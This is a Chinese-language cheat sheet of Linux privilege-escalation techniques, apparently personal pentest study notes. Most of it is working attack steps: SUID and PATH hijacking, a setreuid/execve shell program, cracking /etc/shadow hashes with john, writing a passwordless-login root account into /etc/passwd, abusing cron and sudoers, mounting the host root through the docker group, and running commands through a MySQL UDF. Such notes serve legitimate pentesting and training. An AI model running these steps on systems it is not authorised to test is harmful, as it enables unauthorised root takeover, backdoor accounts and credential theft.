# Linux 提权思路

两个脚本（github上都有）：

- `LinEnum.sh`（这个主要是系统信息收集）
- `linux-exploit-suggester.s`（这个脚本跑完会列出来可能可以利用的CVE）

工具：msf
msf的`local_exploit_suggester`模块可以用来检测漏洞，提权
`use post/multi/recon/local_exploit_suggester`

## 内核漏洞

查看内核版本的命令：
```
uname -a
cat /proc/version
cat /etc/issue
cat /etc/redhat-release
lsb_release -a
```

经典：
脏牛：[https://github.com/Brucetg/DirtyCow-EXP](https://github.com/Brucetg/DirtyCow-EXP)


## SUID提权

三条命令用来查找具有`s`标志位的二进制程序：

- `find / -perm -u=s -type f 2>/dev/null`
- `find / -user root -perm -4000 -print 2>/dev/null`
- `find / -user root -perm -4000 -exec ls -ldb {} \;`

然后可以去[https://gtfobins.github.io/](https://gtfobins.github.io/)搜索了，非常好用的工具站

### 环境变量劫持

需要配合suid，即A必须有s权限。

当存在第三方程序`A`调用linux本身的命令`B`时
需要知道`B`命令是什么，比如  `ps` 这个可以查看进程的命令，这个操作可以使用`xxd`，`strings`来看A中的可打印字符：
`xxd A` or `strings A`
如果发现了明显的`ps`单词，那么就合理推断 A 的执行调用了`ps`命令

环境变量劫持操作如下：

`cd /tmp`                                     //切换到tmp目录下

`echo "/bin/bash" > ps`           //新建一个ps文件，写入/bin/bash

`chmod 777 ps`                            //给自己写的这个ps文件赋予777权限

`echo $PATH`                               //打印当前的环境变量

`export PATH=/tmp:$PATH`        //将/tmp目录设置为环境变量的优先级最高

`./A`                                           //执行A的时候，会根据环境变量去调用`/tmp/ps`，执行`/bin/bash`

### 小程序切换用户

使用有s权限或者root权限的命令，调用下面的程序。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc,char *argv[])
{
setreuid(1000,1000);
execve("/bin/sh",NULL,NULL);
}
```

## 不正常的权限配置

### /etc/shadow可读（/etc/passwd可试一下）
如果能读到加密的用户名密码字符串，类似：`root:$6$URZ1c7qW$z5jZA6/j9fb8d4ExJOWuwCjEFo0BkfV.D3OIf0c0ukepcZYgrBhO6vjpNbmYct1uco9NrtBw3z50tCoMbqb1:18907:0:99999:7:::`

copy出来，放到pass.txt里面，然后使用

`john --wordlist="/usr/share/wordlists/rockyou.txt" pass.txt`

暴力破解

### 可编辑/etc/passwd
使用
`openssl passwd -1 -salt [username] [passwd]`（中括号意味着你可以自定义）
会生成类似
`$1$lu2ker$aD3vzm7HraKREkkdB.18D1` 这样的字符串
字符串拼接构造好格式，参考如下格式：

`lu2ker:$1$lu2ker$aD3vzm7HraKREkkdB.18D1:0:0:root:/root:/bin/bash`

需要注意的是，密码字符串替换的是passwd中每行的x位置，最后的`/bin/bash`也要试情况而定，看看其他账号用的是什么shell

这样就新建了一个root权限的账号，可以su切换了

### 可编辑计划任务程序

两条用于查看计划任务的命令：

`ls -l /etc/cron*`

`cat /etc/crontab`

查看日志，看看有没有其他用户的的计划任务：

`tail -f /var/log/syslog`

**如果有修改权限，找其他用户的计划任务执行的是哪个文件，随心所欲修改它，执行任意命令**

### 可编辑sudo文件

列出目前用户可执行与无法执行的指令。
`sudo -l`

查看`sudo`权限的配置文件：
`cat /etc/sudoers`

看是否有如下字样

`username ALL=(ALL:ALL) NOPASSWD:ALL`

意味着，username这个用户可以不用密码切换到其他sudoer的用户

`sudo su xxx` or `sudo su`

没有的话，如果权限配置错误，能写入，就自己写。

## Docker提权

执行`id`

属于docker组

输入命令下载使用容器 把宿主的根目录 挂载到 容器的/mnt目录

`docker run alpine chroot`                //下载镜像

`docker run -v /:/mnt -it alpine`   //挂载宿主根目录到容器

## SSH私钥泄露

用私钥`id_rsa`登录，注意`authorized_keys`（公钥）中的用户名

私钥是客户端使用的，公钥是服务端（被登录端）放着的。


## Mysql udf提权（貌似没啥用）
**通过自定义库函数来实现执行任意的程序,udf即 用户自定义函数 **

条件：
需要执行sql语句查看一下plugin

`show variables like '%plugin%';`

- 有plugin目录`/usr/lib/mysql/plugin/`
- `secure-file-priv` 不为NULL
- root权限的mysql（必须？）

在sqlmap目录下找对应操作系统的udf库文件：
```
root@kali:/pentest/database/sqlmap/udf/mysql# ls
linux windows
root@kali:/pentest/database/sqlmap/udf/mysql/linux# ls
32 64
root@kali:/pentest/database/sqlmap/udf/mysql/linux/64# ls
lib_mysqludf_sys.so
```

hex一下：
`select hex(load_file('/pentest/database/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so')) into outfile '/tmp/udf.txt';`

将hex后的内容写到mysql库

`select unhex('7F454C46020...') into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';`

查看这个udf库支持的函数有啥：

`nm -D /usr/lib/mysql/plugin/mysqludf.so`

加载`sys_eval`函数并执行：

`create function sys_eval returns string soname "mysqludf.so";`     //加载函数

`select sys_eval('whoami');`       //执行命令
